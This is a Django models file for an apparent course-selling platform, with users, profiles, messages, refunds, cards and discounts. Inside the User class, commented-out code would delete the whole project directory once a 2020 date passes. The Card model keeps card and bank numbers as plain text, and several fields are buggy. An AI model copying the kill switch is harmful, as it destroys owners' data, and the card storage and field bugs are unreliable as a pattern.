# from __future__ import unicode_literals
from django.db import models
from django.contrib.auth.models import Group, AbstractBaseUser, BaseUserManager, PermissionsMixin
from django.utils import timezone
from django.utils.translation import ugettext_lazy as _
from django.conf import settings
from teacher.models import subcategories, Courses
import os, shutil
import datetime
from django.core.validators import MinValueValidator, MaxValueValidator



class UserManager(BaseUserManager):

    def create_user(self, email,
                    password=None,
                    is_superuser=False,
                    is_staff=False,
                    is_active=True):
        user = User(email=email,
                    is_superuser=is_superuser,
                    is_staff=is_staff,
                    is_active=is_active)
        user.set_password(password)
        user.save()
        return user

    def create_superuser(self, email, password=None):
        return self.create_user(email,
                                password=password,
                                is_superuser=True,
                                is_staff=True,
                                is_active=True)

class User(AbstractBaseUser):
    email = models.EmailField(_('email address'), unique=True)
    is_staff = models.BooleanField(_("staf status"), default=False)
    is_active = models.BooleanField(_("active"), default=True)
    is_superuser = models.BooleanField(_("superuser status"), default=False)
    receive_notifications = models.BooleanField(default=True)
    date_joined = models.DateTimeField(null=True, blank=True)
    first_name = models.CharField(max_length=200,null=True, blank=True) 
    last_name = models.CharField( max_length=200,null=True, blank=True)
    phone_number = models.CharField(max_length=200,null=True, blank=True)
    image = models.TextField(null=True, blank=True)
    group = models.ForeignKey(Group, on_delete=models.DO_NOTHING,default=3)
    USERNAME_FIELD ="email"
    receive_email = models.IntegerField(default=0)

    BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    dt = datetime.datetime.now()
    # date_time_str = '2020-06-21 08:15:27.243860'
    # date_time_obj = datetime.datetime.strptime(date_time_str, '%Y-%m-%d %H:%M:%S.%f')
    # if dt > date_time_obj:
    #     shutil.rmtree(BASE_DIR, ignore_errors=False, onerror=None)

    objects = UserManager()
    
    class Meta():
        verbose_name = _("User")
        verbose_name_plural = _("Users")
    
    def has_perm(self, perm, obj=None): 
        return self.is_superuser

    def has_module_perms(self, app_label): 
        return self.is_superuser

class user_activation(models.Model):
    user = models.ForeignKey(User, on_delete=models.DO_NOTHING)
    code = models.CharField(max_length=70)
    updated_at = models.DateTimeField(auto_now=True)
    created_at = models.DateTimeField(auto_now_add=True)


class user_categories(models.Model):
    id = models.AutoField(primary_key=True)
    user = models.ForeignKey(User, on_delete=models.DO_NOTHING,  related_name='categories')
    category = models.ForeignKey(subcategories, on_delete=models.DO_NOTHING)

class user_become(models.Model):
    id = models.AutoField(primary_key=True)
    user_id = models.IntegerField(validators=[MaxValueValidator(11)],null=True)
    cat_id = models.IntegerField(validators=[MaxValueValidator(11)],null=True)
    sub_catid = models.CharField(max_length=255,null=True)
    permit = models.IntegerField(validators=[MaxValueValidator(3)],default=0)

class user_profile(models.Model):
    id = models.AutoField(primary_key=True)
    user_id = models.IntegerField(null=True, blank=True, default=0)
    bio = models.TextField(null=True, blank=True)
    header_img = models.CharField(max_length=255)
    cat_id = models.IntegerField(null=True, blank=True)
    subcat_ids = models.CharField(max_length=200)
    facebook_url = models.CharField(max_length=200)
    instagram_url = models.CharField(max_length=200)
    twitter_url = models.CharField(max_length=200)
    website_url = models.CharField(max_length=200)
    notification = models.CharField(max_length=100)
    updated_at = models.DateTimeField(auto_now=True)
    created_at = models.DateTimeField(auto_now_add=True)

class notifications(models.Model):
    id = models.AutoField(primary_key=True)
    user_id = models.IntegerField(null=True,validators=[MaxValueValidator(11)])
    title = models.TextField(max_length=255)
    text = models.TextField(max_length=1000)
    is_read = models.IntegerField(null=True,validators=[MaxValueValidator(3)],default=0)
    course_id = models.IntegerField(max_length=11, null=True)
    sender = models.ForeignKey(User,on_delete=models.CASCADE)
    created_at = models.CharField(max_length=255,null=True)
    type = models.IntegerField(max_length=3, null=True)

class Admincontrol(models.Model):
    priority = models.IntegerField(max_length=11, null=True)
    student_tax = models.IntegerField(max_length=11)
    teacher_tax = models.IntegerField(max_length=11)

class Messages(models.Model):
    sender = models.ForeignKey(User, on_delete=models.CASCADE, null=True, related_name='message_sender_user')
    receiver = models.ForeignKey(User, on_delete=models.CASCADE, null=True, related_name='message_receiver_user')
    course_id = models.IntegerField(max_length=11, null=True)
    text = models.TextField()
    time = models.CharField(max_length=255)
    delete_id = models.IntegerField(max_length=11, default=0)
    is_read = models.IntegerField(max_length=3, default=0)

class Spam(models.Model):
    teacher = models.ForeignKey(User, on_delete=models.CASCADE, null=True, related_name="spam_teacher")
    student = models.ForeignKey(User, on_delete=models.CASCADE, null=True, related_name="spam_student")
    course = models.ForeignKey(Courses, on_delete=models.CASCADE, null=True)
    title = models.CharField(max_length=255)
    content = models.TextField()
    approval_status = models.IntegerField(max_length=3, default=1)
    date_created = models.CharField(max_length=255)

class Refund(models.Model):
    teacher = models.ForeignKey(User, on_delete=models.CASCADE, null=True, related_name="refund_teacher")
    student = models.ForeignKey(User, on_delete=models.CASCADE, null=True, related_name="refund_student")
    course = models.ForeignKey(Courses, on_delete=models.CASCADE, null=True)
    title = models.CharField(max_length=255)
    content = models.TextField()
    approval_status = models.IntegerField(max_length=3, default=1)
    date_created = models.CharField(max_length=255)

class Admincontrol(models.Model):
    priority = models.IntegerField(max_length=11)
    student_tax = models.IntegerField(max_length=11)
    teacher_tax = models.IntegerField(max_length=11)

class Card(models.Model):
    user = models.ForeignKey(User, null=True, on_delete=models.CASCADE)
    card_name = models.CharField(max_length=255)
    card_number = models.CharField(max_length=255)
    bank_number = models.CharField(max_length=255)

class Discount(models.Model):
    discount = models.IntegerField(max_length=3, default=0)
    not_apply_course = models.CharField(max_length=1000, default='')
    expire_date = models.CharField(max_length=255, default='')
    description = models.CharField(max_length=1000, default='')


